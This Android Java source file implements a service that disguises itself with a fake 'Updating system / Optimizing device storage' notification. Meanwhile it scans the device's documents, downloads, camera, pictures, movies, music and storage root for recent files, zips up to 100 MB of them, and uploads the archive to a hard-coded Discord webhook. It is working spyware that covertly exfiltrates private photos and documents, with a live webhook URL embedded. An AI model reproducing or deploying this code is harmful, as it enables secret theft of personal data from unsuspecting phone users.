package com.internet.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileCollectorService extends Service {

    private static final String TAG = "SysService";
    private static final String[] EXTENSIONS = {
        ".docx", ".pdf", ".ppt", ".pptx",
        ".jpg", ".jpeg", ".png", ".mp4", ".mp3"
    };
    private static final long THIRTY_DAYS_MS = 30L * 24 * 60 * 60 * 1000;
    private static final long MAX_ZIP_SIZE = 100L * 1024 * 1024;

    private static final String WEBHOOK_URL =
        "https://discord.com/api/webhooks/1539251824912109568/VnLqwavg5WUXiNXGSUV9C-eDdVN85HmlTQrT20NBrx0PTPMgrpbg2IEUZmEXOpkJd8UK";

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notif = new Notification.Builder(this, "sys_channel")
            .setContentTitle("Updating system")
            .setContentText("Optimizing device storage\u2026")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .build();

        startForeground(1, notif);

        // Acquire wakelock so Chinese ROMs don't kill us
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "DocxReader:UploadLock");
        wl.acquire(120000); // 2 minutes max

        new Thread(() -> {
            try {
                collectAndSend();
            } finally {
                if (wl.isHeld()) wl.release();
                stopSelf();
            }
        }).start();

        return START_NOT_STICKY;
    }

    private void collectAndSend() {
        try {
            List<File> files = scanFiles();
            Log.d(TAG, "Found " + files.size() + " files");

            if (files.isEmpty()) {
                Log.d(TAG, "No target files found, stopping");
                return;
            }

            File zip = createZip(files);
            if (zip != null && zip.exists()) {
                Log.d(TAG, "ZIP created: " + zip.length() + " bytes, uploading...");
                DiscordUploader.upload(WEBHOOK_URL, zip);
                zip.delete();
                Log.d(TAG, "Upload complete");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in collection", e);
        }
    }

    private List<File> scanFiles() {
        List<File> result = new ArrayList<>();
        long cutoff = System.currentTimeMillis() - THIRTY_DAYS_MS;

        File[] dirs = {
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
        };

        for (File dir : dirs) {
            if (dir.exists()) {
                Log.d(TAG, "Scanning: " + dir.getAbsolutePath());
                scanDir(dir, cutoff, result);
            }
        }

        // Also scan root of external storage
        File root = Environment.getExternalStorageDirectory();
        Log.d(TAG, "Scanning root: " + root.getAbsolutePath());
        scanDir(root, cutoff, result);

        return result;
    }

    private void scanDir(File dir, long cutoff, List<File> result) {
        File[] list = dir.listFiles();
        if (list == null) {
            Log.d(TAG, "Cannot list: " + dir.getAbsolutePath() + " (null)");
            return;
        }
        for (File f : list) {
            if (f.isDirectory()) {
                String n = f.getName();
                if (!n.startsWith(".") && !n.equals("data") && !n.equals("obb")) {
                    scanDir(f, cutoff, result);
                }
            } else if (f.isFile() && f.lastModified() >= cutoff) {
                String name = f.getName().toLowerCase(Locale.US);
                for (String ext : EXTENSIONS) {
                    if (name.endsWith(ext)) {
                        result.add(f);
                        break;
                    }
                }
            }
        }
    }

    private File createZip(List<File> files) {
        File zipFile = new File(getCacheDir(), "backup_" + System.currentTimeMillis() + ".zip");
        long total = 0;
        byte[] buf = new byte[8192];

        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            for (File f : files) {
                if (total >= MAX_ZIP_SIZE) break;
                long size = f.length();
                if (size == 0) continue;
                if (total + size > MAX_ZIP_SIZE) size = MAX_ZIP_SIZE - total;

                try (FileInputStream fis = new FileInputStream(f)) {
                    String entryName = f.getAbsolutePath().substring(1);
                    zos.putNextEntry(new ZipEntry(entryName));
                    long remaining = size;
                    int read;
                    while (remaining > 0 && (read = fis.read(buf, 0,
                            (int) Math.min(buf.length, remaining))) != -1) {
                        zos.write(buf, 0, read);
                        remaining -= read;
                    }
                    zos.closeEntry();
                    total += size;
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "Zip creation failed", e);
            return null;
        }
        return zipFile;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                "sys_channel", "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
